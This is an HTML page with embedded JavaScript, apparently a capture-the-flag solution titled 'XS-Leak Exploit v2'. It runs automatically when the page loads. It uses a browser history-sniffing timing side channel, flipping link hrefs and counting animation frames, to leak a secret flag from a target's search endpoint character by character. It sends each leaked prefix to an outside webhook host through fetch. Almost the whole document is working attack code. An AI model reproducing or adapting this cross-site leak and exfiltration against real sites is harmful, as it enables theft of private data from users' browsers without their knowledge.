<!DOCTYPE html>
<html>
<head>
  <title>XS-Leak Exploit v2</title>
  <style>
    #status { font-family: monospace; font-size: 14px; padding: 20px; white-space: pre-wrap; }
    #log { font-family: monospace; font-size: 12px; padding: 10px; max-height: 400px; overflow-y: auto; background: #f0f0f0; }
  </style>
</head>
<body>
  <div id="status">Initializing...</div>
  <div id="log"></div>

  <script>
    const TARGET = "http://localhost:3000";
    const WEBHOOK = "https://bbgacha.request.dreamhack.games";
    const CHARSET = "ABCDEF0123456789}";
    const FLAG_PREFIX = "DH{";
    const GARBAGE = "X".repeat(2000);

    let leaked = FLAG_PREFIX;
    let popup = null;

    function log(msg) {
      document.getElementById("status").textContent = msg;
      console.log(msg);
    }

    function addLog(msg) {
      const el = document.getElementById("log");
      el.textContent += msg + "\n";
      el.scrollTop = el.scrollHeight;
    }

    function sleep(ms) {
      return new Promise(r => setTimeout(r, ms));
    }

    async function visit(url) {
      if (!popup || popup.closed) {
        popup = window.open("about:blank", "w");
      }
      popup.location = url;
      await sleep(800);
    }

    function measure(url) {
      return new Promise((resolve) => {
        const basis = "https://x" + Math.random() + ".invalid/";
        const link = document.createElement('a');
        link.style.cssText = `
          filter: drop-shadow(0 0 10px red) contrast(150%) saturate(150%);
          transform: perspective(50px) rotateY(30deg);
          text-shadow: 0 0 10px blue;
          position: fixed; left: -9999px;
        `;
        link.textContent = GARBAGE;
        link.href = basis;
        document.body.appendChild(link);

        let ticks = 0;
        let rafId;
        let flip = true;

        const osc = setInterval(() => {
          link.href = flip ? url : basis;
          flip = !flip;
        }, 0);

        const count = () => { ticks++; rafId = requestAnimationFrame(count); };
        rafId = requestAnimationFrame(count);

        setTimeout(() => {
          clearInterval(osc);
          cancelAnimationFrame(rafId);
          link.remove();
          resolve(ticks);
        }, 200);
      });
    }

    // Test a single character and return its tick count
    async function testOne(char) {
      const query = leaked + char;
      const url = `${TARGET}/posts/search?query=${encodeURIComponent(query)}`;

      await visit(url);
      await sleep(200);

      // Take 3 measurements and use minimum
      let minTicks = Infinity;
      for (let i = 0; i < 3; i++) {
        const t = await measure(url);
        if (t < minTicks) minTicks = t;
        await sleep(30);
      }

      return { char, ticks: minTicks, url };
    }

    // Find character with LOWEST tick count (most "visited")
    async function findNextChar() {
      const results = [];

      // Also test a baseline (definitely unvisited)
      const baseUrl = `${TARGET}/posts/search?query=${encodeURIComponent(leaked + "ZZZZNOTEXIST")}`;
      await visit(baseUrl);
      await sleep(200);
      let baseTicks = Infinity;
      for (let i = 0; i < 3; i++) {
        const t = await measure(baseUrl);
        if (t < baseTicks) baseTicks = t;
        await sleep(30);
      }
      addLog(`Baseline (404): ${baseTicks} ticks`);

      for (const char of CHARSET) {
        log(`Testing: ${leaked + char}`);
        const result = await testOne(char);
        results.push(result);
        addLog(`'${char}': ${result.ticks} ticks (ratio: ${(result.ticks/baseTicks).toFixed(3)})`);
        await sleep(100);
      }

      // Sort by ticks (ascending) - lowest = most visited
      results.sort((a, b) => a.ticks - b.ticks);

      // The correct character should have significantly lower ticks than baseline
      const best = results[0];
      const secondBest = results[1];
      const ratio = best.ticks / baseTicks;

      addLog(`\nBest: '${best.char}' = ${best.ticks}, Second: '${secondBest.char}' = ${secondBest.ticks}`);
      addLog(`Ratio to baseline: ${ratio.toFixed(3)}`);

      // If best is significantly better than second best AND better than baseline
      if (ratio < 0.85 && best.ticks < secondBest.ticks * 0.9) {
        return best.char;
      }

      // Fallback: just return the best if it's clearly better than baseline
      if (ratio < 0.75) {
        return best.char;
      }

      addLog("No clear winner found");
      return null;
    }

    async function exploit() {
      log("Starting XS-Leak attack v2...");
      addLog("Using comparative method - finding char with lowest ticks\n");

      // Verify prefix works
      const prefixUrl = `${TARGET}/posts/search?query=${encodeURIComponent(FLAG_PREFIX)}`;
      await visit(prefixUrl);
      await sleep(500);
      const prefixTicks = await measure(prefixUrl);
      addLog(`Prefix 'DH{' ticks: ${prefixTicks}\n`);

      while (!leaked.endsWith("}") && leaked.length < 50) {
        addLog(`\n--- Finding char #${leaked.length + 1} ---`);
        const nextChar = await findNextChar();

        if (nextChar === null) {
          log(`Stuck at: ${leaked}`);
          break;
        }

        leaked += nextChar;
        log(`FOUND: ${leaked}`);
        addLog(`\n>>> LEAKED: ${leaked}\n`);
        sendWebhook(leaked);

        await sleep(500);
      }

      log(`\n=== FINAL: ${leaked} ===`);
    }

    function sendWebhook(data) {
      if (WEBHOOK === "YOUR_WEBHOOK_URL") return;
      fetch(`${WEBHOOK}?flag=${encodeURIComponent(data)}`, { mode: 'no-cors' }).catch(() => {});
    }

    window.onload = () => setTimeout(exploit, 500);
  </script>
</body>
</html>
